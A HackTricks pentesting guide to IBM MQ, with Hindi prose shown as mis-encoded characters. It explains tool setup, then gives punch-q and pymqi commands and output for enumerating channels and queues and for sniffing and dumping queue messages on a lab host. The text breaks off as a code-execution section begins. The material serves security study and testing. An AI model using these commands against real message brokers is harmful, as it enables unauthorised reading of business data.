# 1414 - Pentesting IBM MQ

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Basic information

IBM MQ ‡§è‡§ï IBM ‡§§‡§ï‡§®‡•Ä‡§ï ‡§π‡•à ‡§ú‡•ã ‡§∏‡§Ç‡§¶‡•á‡§∂ ‡§ï‡§§‡§æ‡§∞‡•ã‡§Ç ‡§ï‡§æ ‡§™‡•ç‡§∞‡§¨‡§Ç‡§ß‡§® ‡§ï‡§∞‡§§‡•Ä ‡§π‡•à‡•§ ‡§Ö‡§®‡•ç‡§Ø **message broker** ‡§§‡§ï‡§®‡•Ä‡§ï‡•ã‡§Ç ‡§ï‡•Ä ‡§§‡§∞‡§π, ‡§Ø‡§π ‡§â‡§§‡•ç‡§™‡§æ‡§¶‡§ï‡•ã‡§Ç ‡§î‡§∞ ‡§â‡§™‡§≠‡•ã‡§ï‡•ç‡§§‡§æ‡§ì‡§Ç ‡§ï‡•á ‡§¨‡•Ä‡§ö ‡§ú‡§æ‡§®‡§ï‡§æ‡§∞‡•Ä ‡§™‡•ç‡§∞‡§æ‡§™‡•ç‡§§ ‡§ï‡§∞‡§®‡•á, ‡§∏‡§Ç‡§ó‡•ç‡§∞‡§π‡•Ä‡§§ ‡§ï‡§∞‡§®‡•á, ‡§∏‡§Ç‡§∏‡§æ‡§ß‡§ø‡§§ ‡§ï‡§∞‡§®‡•á ‡§î‡§∞ ‡§µ‡§∞‡•ç‡§ó‡•Ä‡§ï‡•É‡§§ ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§∏‡§Æ‡§∞‡•ç‡§™‡§ø‡§§ ‡§π‡•à‡•§

‡§°‡§ø‡§´‡§º‡•â‡§≤‡•ç‡§ü ‡§∞‡•Ç‡§™ ‡§∏‡•á, **‡§Ø‡§π IBM MQ TCP ‡§™‡•ã‡§∞‡•ç‡§ü 1414 ‡§ï‡•ã ‡§â‡§ú‡§æ‡§ó‡§∞ ‡§ï‡§∞‡§§‡§æ ‡§π‡•à**‡•§ ‡§ï‡§≠‡•Ä-‡§ï‡§≠‡•Ä, HTTP REST API ‡§™‡•ã‡§∞‡•ç‡§ü **9443** ‡§™‡§∞ ‡§â‡§ú‡§æ‡§ó‡§∞ ‡§π‡•ã ‡§∏‡§ï‡§§‡§æ ‡§π‡•à‡•§ ‡§Æ‡•á‡§ü‡•ç‡§∞‡§ø‡§ï‡•ç‡§∏ (Prometheus) ‡§ï‡•ã TCP ‡§™‡•ã‡§∞‡•ç‡§ü **9157** ‡§∏‡•á ‡§≠‡•Ä ‡§è‡§ï‡•ç‡§∏‡•á‡§∏ ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à‡•§

IBM MQ TCP ‡§™‡•ã‡§∞‡•ç‡§ü 1414 ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§∏‡§Ç‡§¶‡•á‡§∂‡•ã‡§Ç, ‡§ï‡§§‡§æ‡§∞‡•ã‡§Ç, ‡§ö‡•à‡§®‡§≤‡•ã‡§Ç, ... ‡§ï‡•ã ‡§π‡•á‡§∞‡§´‡•á‡§∞ ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à, ‡§≤‡•á‡§ï‡§ø‡§® **‡§á‡§Ç‡§∏‡•ç‡§ü‡•á‡§Ç‡§∏ ‡§ï‡•ã ‡§®‡§ø‡§Ø‡§Ç‡§§‡•ç‡§∞‡§ø‡§§ ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§≠‡•Ä**‡•§

IBM ‡§è‡§ï ‡§¨‡§°‡§º‡§æ ‡§§‡§ï‡§®‡•Ä‡§ï‡•Ä ‡§¶‡§∏‡•ç‡§§‡§æ‡§µ‡•á‡§ú‡§º ‡§™‡•ç‡§∞‡§¶‡§æ‡§® ‡§ï‡§∞‡§§‡§æ ‡§π‡•à ‡§ú‡•ã [https://www.ibm.com/docs/en/ibm-mq](https://www.ibm.com/docs/en/ibm-mq) ‡§™‡§∞ ‡§â‡§™‡§≤‡§¨‡•ç‡§ß ‡§π‡•à‡•§

## Tools

‡§Ü‡§∏‡§æ‡§® ‡§∂‡•ã‡§∑‡§£ ‡§ï‡•á ‡§≤‡§ø‡§è ‡§è‡§ï ‡§∏‡•Å‡§ù‡§æ‡§Ø‡§æ ‡§ó‡§Ø‡§æ ‡§â‡§™‡§ï‡§∞‡§£ ‡§π‡•à **[punch-q](https://github.com/sensepost/punch-q)**, ‡§ú‡§ø‡§∏‡§Æ‡•á‡§Ç Docker ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§ø‡§Ø‡§æ ‡§ó‡§Ø‡§æ ‡§π‡•à‡•§ ‡§Ø‡§π ‡§â‡§™‡§ï‡§∞‡§£ ‡§∏‡§ï‡•ç‡§∞‡§ø‡§Ø ‡§∞‡•Ç‡§™ ‡§∏‡•á Python ‡§™‡•Å‡§∏‡•ç‡§§‡§ï‡§æ‡§≤‡§Ø `pymqi` ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞ ‡§∞‡§π‡§æ ‡§π‡•à‡•§

‡§è‡§ï ‡§Ö‡§ß‡§ø‡§ï ‡§Æ‡•à‡§®‡•Å‡§Ö‡§≤ ‡§¶‡•É‡§∑‡•ç‡§ü‡§ø‡§ï‡•ã‡§£ ‡§ï‡•á ‡§≤‡§ø‡§è, Python ‡§™‡•Å‡§∏‡•ç‡§§‡§ï‡§æ‡§≤‡§Ø **[pymqi](https://github.com/dsuch/pymqi)** ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡•á‡§Ç‡•§ [IBM MQ dependencies](https://www.ibm.com/support/fixcentral/swg/selectFixes?parent=ibm%7EWebSphere&product=ibm/WebSphere/WebSphere+MQ&release=9.0.0.4&platform=All&function=fixId&fixids=9.0.0.4-IBM-MQC-*,9.0.0.4-IBM-MQ-Install-Java-All,9.0.0.4-IBM-MQ-Java-InstallRA&useReleaseAsTarget=true&includeSupersedes=0&source=fc) ‡§ï‡•Ä ‡§Ü‡§µ‡§∂‡•ç‡§Ø‡§ï‡§§‡§æ ‡§π‡•à‡•§

### Installing pymqi

**IBM MQ dependencies** ‡§ï‡•ã ‡§∏‡•ç‡§•‡§æ‡§™‡§ø‡§§ ‡§î‡§∞ ‡§≤‡•ã‡§° ‡§ï‡§∞‡§®‡•á ‡§ï‡•Ä ‡§Ü‡§µ‡§∂‡•ç‡§Ø‡§ï‡§§‡§æ ‡§π‡•à:

1. [https://login.ibm.com/](https://login.ibm.com/) ‡§™‡§∞ ‡§è‡§ï ‡§ñ‡§æ‡§§‡§æ (IBMid) ‡§¨‡§®‡§æ‡§è‡§Ç‡•§
2. [https://www.ibm.com/support/fixcentral/swg/selectFixes?parent=ibm%7EWebSphere&product=ibm/WebSphere/WebSphere+MQ&release=9.0.0.4&platform=All&function=fixId&fixids=9.0.0.4-IBM-MQC-*,9.0.0.4-IBM-MQ-Install-Java-All,9.0.0.4-IBM-MQ-Java-InstallRA&useReleaseAsTarget=true&includeSupersedes=0&source=fc](https://www.ibm.com/support/fixcentral/swg/selectFixes?parent=ibm%7EWebSphere&product=ibm/WebSphere/WebSphere+MQ&release=9.0.0.4&platform=All&function=fixId&fixids=9.0.0.4-IBM-MQC-*,9.0.0.4-IBM-MQ-Install-Java-All,9.0.0.4-IBM-MQ-Java-InstallRA&useReleaseAsTarget=true&includeSupersedes=0&source=fc) ‡§∏‡•á IBM MQ ‡§™‡•Å‡§∏‡•ç‡§§‡§ï‡§æ‡§≤‡§Ø ‡§°‡§æ‡§â‡§®‡§≤‡•ã‡§° ‡§ï‡§∞‡•á‡§Ç‡•§ Linux x86_64 ‡§ï‡•á ‡§≤‡§ø‡§è ‡§Ø‡§π **9.0.0.4-IBM-MQC-LinuxX64.tar.gz** ‡§π‡•à‡•§
3. ‡§°‡§ø‡§ï‡§Ç‡§™‡•ç‡§∞‡•á‡§∏ ‡§ï‡§∞‡•á‡§Ç (`tar xvzf 9.0.0.4-IBM-MQC-LinuxX64.tar.gz`)‡•§
4. ‡§≤‡§æ‡§á‡§∏‡•á‡§Ç‡§∏ ‡§∂‡§∞‡•ç‡§§‡•ã‡§Ç ‡§ï‡•ã ‡§∏‡•ç‡§µ‡•Ä‡§ï‡§æ‡§∞ ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è `sudo ./mqlicense.sh` ‡§ö‡§≤‡§æ‡§è‡§Ç‡•§

>‡§Ø‡§¶‡§ø ‡§Ü‡§™ Kali Linux ‡§™‡§∞ ‡§π‡•à‡§Ç, ‡§§‡•ã ‡§´‡§º‡§æ‡§á‡§≤ `mqlicense.sh` ‡§ï‡•ã ‡§∏‡§Ç‡§∂‡•ã‡§ß‡§ø‡§§ ‡§ï‡§∞‡•á‡§Ç: ‡§®‡§ø‡§Æ‡•ç‡§®‡§≤‡§ø‡§ñ‡§ø‡§§ ‡§™‡§Ç‡§ï‡•ç‡§§‡§ø‡§Ø‡•ã‡§Ç ‡§ï‡•ã ‡§π‡§ü‡§æ ‡§¶‡•á‡§Ç/‡§ï‡§Æ‡•á‡§Ç‡§ü ‡§ï‡§∞‡•á‡§Ç (‡§™‡§Ç‡§ï‡•ç‡§§‡§ø‡§Ø‡•ã‡§Ç 105-110 ‡§ï‡•á ‡§¨‡•Ä‡§ö):
>
>```bash
>if [ ${BUILD_PLATFORM} != `uname`_`uname ${UNAME_FLAG}` ]
>  then
>    echo "ERROR: This package is incompatible with this system"
>    echo "       This package was built for ${BUILD_PLATFORM}"
>    exit 1
>fi
>```

5. ‡§á‡§® ‡§™‡•à‡§ï‡•á‡§ú‡•ã‡§Ç ‡§ï‡•ã ‡§∏‡•ç‡§•‡§æ‡§™‡§ø‡§§ ‡§ï‡§∞‡•á‡§Ç:
```bash
sudo rpm --prefix /opt/mqm -ivh --nodeps --force-debian MQSeriesRuntime-9.0.0-4.x86_64.rpm
sudo rpm --prefix /opt/mqm -ivh --nodeps --force-debian MQSeriesClient-9.0.0-4.x86_64.rpm
sudo rpm --prefix /opt/mqm -ivh --nodeps --force-debian MQSeriesSDK-9.0.0-4.x86_64.rpm
```
6. ‡§´‡§ø‡§∞, ‡§Ö‡§∏‡•ç‡§•‡§æ‡§Ø‡•Ä ‡§∞‡•Ç‡§™ ‡§∏‡•á `.so` ‡§´‡§º‡§æ‡§á‡§≤‡•ã‡§Ç ‡§ï‡•ã LD ‡§Æ‡•á‡§Ç ‡§ú‡•ã‡§°‡§º‡•á‡§Ç: `export LD_LIBRARY_PATH=/opt/mqm/lib64`, **‡§Ö‡§®‡•ç‡§Ø ‡§â‡§™‡§ï‡§∞‡§£‡•ã‡§Ç ‡§ï‡•ã ‡§á‡§® ‡§®‡§ø‡§∞‡•ç‡§≠‡§∞‡§§‡§æ‡§ì‡§Ç ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§®‡•á ‡§∏‡•á ‡§™‡§π‡§≤‡•á** ‡§ö‡§≤‡§æ‡§®‡•á ‡§∏‡•á ‡§™‡§π‡§≤‡•á‡•§

‡§´‡§ø‡§∞, ‡§Ü‡§™ ‡§™‡•ç‡§∞‡•ã‡§ú‡•á‡§ï‡•ç‡§ü [**pymqi**](https://github.com/dsuch/pymqi) ‡§ï‡•ã ‡§ï‡•ç‡§≤‡•ã‡§® ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç: ‡§á‡§∏‡§Æ‡•á‡§Ç ‡§¶‡§ø‡§≤‡§ö‡§∏‡•ç‡§™ ‡§ï‡•ã‡§° ‡§∏‡•ç‡§®‡§ø‡§™‡•á‡§ü, ‡§∏‡•ç‡§•‡§ø‡§∞‡§æ‡§Ç‡§ï, ... ‡§∂‡§æ‡§Æ‡§ø‡§≤ ‡§π‡•à‡§Ç‡•§ ‡§Ø‡§æ ‡§Ü‡§™ ‡§∏‡•Ä‡§ß‡•á ‡§≤‡§æ‡§á‡§¨‡•ç‡§∞‡•á‡§∞‡•Ä ‡§ï‡•ã ‡§∏‡•ç‡§•‡§æ‡§™‡§ø‡§§ ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç: `pip install pymqi`‡•§

### Using punch-q

#### With Docker

‡§¨‡§∏ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡•á‡§Ç: `sudo docker run --rm -ti leonjza/punch-q`‡•§

#### Without Docker

‡§™‡•ç‡§∞‡•ã‡§ú‡•á‡§ï‡•ç‡§ü [**punch-q**](https://github.com/sensepost/punch-q) ‡§ï‡•ã ‡§ï‡•ç‡§≤‡•ã‡§® ‡§ï‡§∞‡•á‡§Ç ‡§´‡§ø‡§∞ ‡§∏‡•ç‡§•‡§æ‡§™‡§®‡§æ ‡§ï‡•á ‡§≤‡§ø‡§è ‡§∞‡•Ä‡§°‡§Æ‡•Ä ‡§ï‡§æ ‡§™‡§æ‡§≤‡§® ‡§ï‡§∞‡•á‡§Ç (`pip install -r requirements.txt && python3 setup.py install`)‡•§

‡§á‡§∏‡§ï‡•á ‡§¨‡§æ‡§¶, ‡§á‡§∏‡•á `punch-q` ‡§ï‡§Æ‡§æ‡§Ç‡§° ‡§ï‡•á ‡§∏‡§æ‡§• ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à‡•§

## Enumeration

‡§Ü‡§™ **punch-q** ‡§Ø‡§æ **pymqi** ‡§ï‡•á ‡§∏‡§æ‡§• **‡§ï‡•ç‡§Ø‡•Ç ‡§™‡•ç‡§∞‡§¨‡§Ç‡§ß‡§ï ‡§ï‡§æ ‡§®‡§æ‡§Æ, ‡§â‡§™‡§Ø‡•ã‡§ó‡§ï‡§∞‡•ç‡§§‡§æ, ‡§ö‡•à‡§®‡§≤ ‡§î‡§∞ ‡§ï‡•ç‡§Ø‡•Ç** ‡§ï‡•ã ‡§∏‡•Ç‡§ö‡•Ä‡§¨‡§¶‡•ç‡§ß ‡§ï‡§∞‡§®‡•á ‡§ï‡§æ ‡§™‡•ç‡§∞‡§Ø‡§æ‡§∏ ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç‡•§

### Queue Manager

‡§ï‡§≠‡•Ä-‡§ï‡§≠‡•Ä, ‡§ï‡•ç‡§Ø‡•Ç ‡§™‡•ç‡§∞‡§¨‡§Ç‡§ß‡§ï ‡§ï‡§æ ‡§®‡§æ‡§Æ ‡§™‡•ç‡§∞‡§æ‡§™‡•ç‡§§ ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§ñ‡§ø‡§≤‡§æ‡§´ ‡§ï‡•ã‡§à ‡§∏‡•Å‡§∞‡§ï‡•ç‡§∑‡§æ ‡§®‡§π‡•Ä‡§Ç ‡§π‡•ã‡§§‡•Ä ‡§π‡•à:
```bash
‚ùØ sudo docker run --rm -ti leonjza/punch-q --host 172.17.0.2 --port 1414 discover name
Queue Manager name: MYQUEUEMGR
```
### Channels

**punch-q** ‡§è‡§ï ‡§Ü‡§Ç‡§§‡§∞‡§ø‡§ï (‡§∏‡§Ç‡§∂‡•ã‡§ß‡§ø‡§§ ‡§ï‡§∞‡§®‡•á ‡§Ø‡•ã‡§ó‡•ç‡§Ø) ‡§∂‡§¨‡•ç‡§¶ ‡§∏‡•Ç‡§ö‡•Ä ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞ ‡§∞‡§π‡§æ ‡§π‡•à ‡§§‡§æ‡§ï‡§ø ‡§Æ‡•å‡§ú‡•Ç‡§¶‡§æ ‡§ö‡•à‡§®‡§≤‡•ã‡§Ç ‡§ï‡•ã ‡§ñ‡•ã‡§ú‡§æ ‡§ú‡§æ ‡§∏‡§ï‡•á‡•§ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§æ ‡§â‡§¶‡§æ‡§π‡§∞‡§£:
```bash
‚ùØ sudo docker run --rm -ti leonjza/punch-q --host 172.17.0.2 --port 1414 --username admin --password passw0rd discover channels
"DEV.ADMIN.SVRCONN" exists and was authorised.
"SYSTEM.AUTO.SVRCONN" might exist, but user was not authorised.
"SYSTEM.DEF.SVRCONN" might exist, but user was not authorised.
```
‡§Ø‡§π ‡§π‡•ã‡§§‡§æ ‡§π‡•à ‡§ï‡§ø ‡§ï‡•Å‡§õ IBM MQ ‡§â‡§¶‡§æ‡§π‡§∞‡§£ **‡§Ö‡§™‡•ç‡§∞‡§Æ‡§æ‡§£‡§ø‡§§** MQ ‡§Ö‡§®‡•Å‡§∞‡•ã‡§ß‡•ã‡§Ç ‡§ï‡•ã ‡§∏‡•ç‡§µ‡•Ä‡§ï‡§æ‡§∞ ‡§ï‡§∞‡§§‡•á ‡§π‡•à‡§Ç, ‡§á‡§∏‡§≤‡§ø‡§è `--username / --password` ‡§ï‡•Ä ‡§Ü‡§µ‡§∂‡•ç‡§Ø‡§ï‡§§‡§æ ‡§®‡§π‡•Ä‡§Ç ‡§π‡•à‡•§ ‡§¨‡•á‡§∂‡§ï, ‡§™‡§π‡•Å‡§Å‡§ö ‡§Ö‡§ß‡§ø‡§ï‡§æ‡§∞ ‡§≠‡•Ä ‡§≠‡§ø‡§®‡•ç‡§® ‡§π‡•ã ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç‡•§

‡§ú‡•à‡§∏‡•á ‡§π‡•Ä ‡§π‡§Æ‡•á‡§Ç ‡§è‡§ï ‡§ö‡•à‡§®‡§≤ ‡§®‡§æ‡§Æ ‡§Æ‡§ø‡§≤‡§§‡§æ ‡§π‡•à (‡§Ø‡§π‡§æ‡§Å: `DEV.ADMIN.SVRCONN`), ‡§π‡§Æ ‡§∏‡§≠‡•Ä ‡§Ö‡§®‡•ç‡§Ø ‡§ö‡•à‡§®‡§≤‡•ã‡§Ç ‡§ï‡•Ä ‡§ó‡§£‡§®‡§æ ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç‡•§

‡§ó‡§£‡§®‡§æ ‡§Æ‡•Ç‡§≤ ‡§∞‡•Ç‡§™ ‡§∏‡•á ‡§á‡§∏ ‡§ï‡•ã‡§° ‡§∏‡•ç‡§®‡§ø‡§™‡•á‡§ü `code/examples/dis_channels.py` ‡§∏‡•á ‡§ï‡•Ä ‡§ú‡§æ ‡§∏‡§ï‡§§‡•Ä ‡§π‡•à **pymqi**:
```python
import logging
import pymqi

logging.basicConfig(level=logging.INFO)

queue_manager = 'MYQUEUEMGR'
channel = 'DEV.ADMIN.SVRCONN'
host = '172.17.0.2'
port = '1414'
conn_info = '%s(%s)' % (host, port)
user = 'admin'
password = 'passw0rd'

prefix = '*'

args = {pymqi.CMQCFC.MQCACH_CHANNEL_NAME: prefix}

qmgr = pymqi.connect(queue_manager, channel, conn_info, user, password)
pcf = pymqi.PCFExecute(qmgr)

try:
response = pcf.MQCMD_INQUIRE_CHANNEL(args)
except pymqi.MQMIError as e:
if e.comp == pymqi.CMQC.MQCC_FAILED and e.reason == pymqi.CMQC.MQRC_UNKNOWN_OBJECT_NAME:
logging.info('No channels matched prefix `%s`' % prefix)
else:
raise
else:
for channel_info in response:
channel_name = channel_info[pymqi.CMQCFC.MQCACH_CHANNEL_NAME]
logging.info('Found channel `%s`' % channel_name)

qmgr.disconnect()

```
... ‡§≤‡•á‡§ï‡§ø‡§® **punch-q** ‡§â‡§∏ ‡§≠‡§æ‡§ó ‡§ï‡•ã ‡§≠‡•Ä ‡§è‡§Æ‡•ç‡§¨‡•á‡§° ‡§ï‡§∞‡§§‡§æ ‡§π‡•à (‡§î‡§∞ ‡§Ö‡§ß‡§ø‡§ï ‡§ú‡§æ‡§®‡§ï‡§æ‡§∞‡•Ä ‡§ï‡•á ‡§∏‡§æ‡§•!)‡•§  
‡§á‡§∏‡•á ‡§≤‡•â‡§®‡•ç‡§ö ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à:
```bash
‚ùØ sudo docker run --rm -ti leonjza/punch-q --host 172.17.0.2 --port 1414 --username admin --password passw0rd --channel DEV.ADMIN.SVRCONN show channels -p '*'
Showing channels with prefix: "*"...

| Name                 | Type              | MCA UID | Conn Name | Xmit Queue | Description     | SSL Cipher |
|----------------------|-------------------|---------|-----------|------------|-----------------|------------|
| DEV.ADMIN.SVRCONN    | Server-connection |         |           |            |                 |            |
| DEV.APP.SVRCONN      | Server-connection | app     |           |            |                 |            |
| SYSTEM.AUTO.RECEIVER | Receiver          |         |           |            | Auto-defined by |            |
| SYSTEM.AUTO.SVRCONN  | Server-connection |         |           |            | Auto-defined by |            |
| SYSTEM.DEF.AMQP      | AMQP              |         |           |            |                 |            |
| SYSTEM.DEF.CLUSRCVR  | Cluster-receiver  |         |           |            |                 |            |
| SYSTEM.DEF.CLUSSDR   | Cluster-sender    |         |           |            |                 |            |
| SYSTEM.DEF.RECEIVER  | Receiver          |         |           |            |                 |            |
| SYSTEM.DEF.REQUESTER | Requester         |         |           |            |                 |            |
| SYSTEM.DEF.SENDER    | Sender            |         |           |            |                 |            |
| SYSTEM.DEF.SERVER    | Server            |         |           |            |                 |            |
| SYSTEM.DEF.SVRCONN   | Server-connection |         |           |            |                 |            |
| SYSTEM.DEF.CLNTCONN  | Client-connection |         |           |            |                 |            |
```
### Queues

‡§è‡§ï ‡§ï‡•ã‡§° ‡§∏‡•ç‡§®‡§ø‡§™‡•á‡§ü ‡§π‡•à **pymqi** (`dis_queues.py`) ‡§≤‡•á‡§ï‡§ø‡§® **punch-q** ‡§ï‡§§‡§æ‡§∞‡•ã‡§Ç ‡§ï‡•á ‡§¨‡§æ‡§∞‡•á ‡§Æ‡•á‡§Ç ‡§Ö‡§ß‡§ø‡§ï ‡§ú‡§æ‡§®‡§ï‡§æ‡§∞‡•Ä ‡§™‡•ç‡§∞‡§æ‡§™‡•ç‡§§ ‡§ï‡§∞‡§®‡•á ‡§ï‡•Ä ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø ‡§¶‡•á‡§§‡§æ ‡§π‡•à:
```bash
‚ùØ sudo docker run --rm -ti leonjza/punch-q --host 172.17.0.2 --port 1414 --username admin --password passw0rd --channel DEV.ADMIN.SVRCONN show queues -p '*'
Showing queues with prefix: "*"...
| Created   | Name                 | Type   | Usage   | Depth  | Rmt. QM | Rmt. Qu | Description                       |
|           |                      |        |         |        | GR Name | eue Nam |                                   |
|           |                      |        |         |        |         | e       |                                   |
|-----------|----------------------|--------|---------|--------|---------|---------|-----------------------------------|
| 2023-10-1 | DEV.DEAD.LETTER.QUEU | Local  | Normal  | 0      |         |         |                                   |
| 0 18.35.1 | E                    |        |         |        |         |         |                                   |
| 9         |                      |        |         |        |         |         |                                   |
| 2023-10-1 | DEV.QUEUE.1          | Local  | Normal  | 0      |         |         |                                   |
| 0 18.35.1 |                      |        |         |        |         |         |                                   |
| 9         |                      |        |         |        |         |         |                                   |
| 2023-10-1 | DEV.QUEUE.2          | Local  | Normal  | 0      |         |         |                                   |
| 0 18.35.1 |                      |        |         |        |         |         |                                   |
| 9         |                      |        |         |        |         |         |                                   |
| 2023-10-1 | DEV.QUEUE.3          | Local  | Normal  | 0      |         |         |                                   |
| 0 18.35.1 |                      |        |         |        |         |         |                                   |
| 9         |                      |        |         |        |         |         |                                   |
# Truncated
```
## Exploit

### Dump messages

‡§Ü‡§™ ‡§ï‡§§‡§æ‡§∞(‡•ã‡§Ç)/‡§ö‡•à‡§®‡§≤(‡•ã‡§Ç) ‡§ï‡•ã ‡§≤‡§ï‡•ç‡§∑‡§ø‡§§ ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç ‡§§‡§æ‡§ï‡§ø ‡§â‡§®‡§∏‡•á ‡§∏‡§Ç‡§¶‡•á‡§∂‡•ã‡§Ç ‡§ï‡•ã ‡§∏‡•ç‡§®‡§ø‡§´‡§º/‡§°‡§Ç‡§™ ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ ‡§∏‡§ï‡•á (‡§ó‡•à‡§∞-‡§®‡§æ‡§∂‡§ï ‡§ë‡§™‡§∞‡•á‡§∂‡§®)‡•§ *Examples:*
```bash
‚ùØ sudo docker run --rm -ti leonjza/punch-q --host 172.17.0.2 --port 1414 --username admin --password passw0rd --channel DEV.ADMIN.SVRCONN messages sniff
```

```bash
‚ùØ sudo docker run --rm -ti leonjza/punch-q --host 172.17.0.2 --port 1414 --username admin --password passw0rd --channel DEV.ADMIN.SVRCONN messages dump
```
**‡§∏‡§≠‡•Ä ‡§™‡§π‡§ö‡§æ‡§®‡•á ‡§ó‡§è ‡§ï‡§§‡§æ‡§∞‡•ã‡§Ç ‡§™‡§∞ ‡§¶‡•ã‡§π‡§∞‡§æ‡§®‡•á ‡§Æ‡•á‡§Ç ‡§∏‡§Ç‡§ï‡•ã‡§ö ‡§® ‡§ï‡§∞‡•á‡§Ç‡•§**

### ‡§ï‡•ã‡§° ‡§®‡§ø‡§∑‡•ç‡§™‡§æ‡§¶‡§®

> ‡§ï‡•Å‡§õ ‡§µ‡§ø‡§µ‡§∞‡§£ ‡§Ü‡§ó‡•á ‡§¨‡§¢‡§º‡§®‡•á ‡§∏‡•á ‡§™‡§π‡§≤‡•á: IBM MQ ‡§ï‡•ã ‡§ï‡§à ‡§§‡§∞‡•Ä‡§ï‡•ã‡§Ç ‡§∏‡•á ‡§®‡§ø‡§Ø‡§Ç‡§§‡•ç‡§∞‡§ø‡§§ ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à: MQSC, PCF, ‡§®‡§ø‡§Ø‡§Ç‡§§‡•ç‡§∞‡§£ ‡§ï‡§Æ‡§æ‡§Ç‡§°‡•§ ‡§ï‡•Å‡§õ ‡§∏‡§æ‡§Æ‡§æ‡§®‡•ç‡§Ø ‡§∏‡•Ç‡§ö‡§ø‡§Ø‡§æ‡§Å [IBM MQ ‡§¶‡§∏‡•ç‡§§‡§æ‡§µ‡•á‡§ú‡§º](https://www.ibm.com/docs/en/ibm-mq/9.2?topic=reference-command-sets-comparison) ‡§Æ‡•á‡§Ç ‡§™‡§æ‡§à ‡§ú‡§æ ‡§∏‡§ï‡§§‡•Ä ‡§π‡•à‡§Ç‡•§
> [**PCF**](https://www.ibm.com/docs/en/ibm-mq/9.3?topic=commands-introduction-mq-programmable-command-formats) (***‡§™‡•ç‡§∞‡•ã‡§ó‡•ç‡§∞‡§æ‡§Æ‡•á‡§¨‡§≤ ‡§ï‡§Æ‡§æ‡§Ç‡§° ‡§´‡•â‡§∞‡•ç‡§Æ‡•á‡§ü‡•ç‡§∏***) ‡§™‡§∞ ‡§π‡§Æ ‡§¶‡•Ç‡§∞‡§∏‡•ç‡§• ‡§∞‡•Ç‡§™ ‡§∏‡•á ‡§â‡§¶‡§æ‡§π‡§∞‡§£ ‡§ï‡•á ‡§∏‡§æ‡§• ‡§¨‡§æ‡§§‡§ö‡•Ä‡§§ ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§ß‡•ç‡§Ø‡§æ‡§® ‡§ï‡•á‡§Ç‡§¶‡•ç‡§∞‡§ø‡§§ ‡§ï‡§∞ ‡§∞‡§π‡•á ‡§π‡•à‡§Ç‡•§ **punch-q** ‡§î‡§∞ ‡§á‡§∏‡§ï‡•á ‡§Ö‡§≤‡§æ‡§µ‡§æ **pymqi** PCF ‡§á‡§Ç‡§ü‡§∞‡•à‡§ï‡•ç‡§∂‡§® ‡§™‡§∞ ‡§Ü‡§ß‡§æ‡§∞‡§ø‡§§ ‡§π‡•à‡§Ç‡•§
>
> ‡§Ü‡§™ PCF ‡§ï‡§Æ‡§æ‡§Ç‡§° ‡§ï‡•Ä ‡§è‡§ï ‡§∏‡•Ç‡§ö‡•Ä ‡§™‡§æ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç:
> * [PCF ‡§¶‡§∏‡•ç‡§§‡§æ‡§µ‡•á‡§ú‡§º ‡§∏‡•á](https://www.ibm.com/docs/en/ibm-mq/9.3?topic=reference-definitions-programmable-command-formats), ‡§î‡§∞
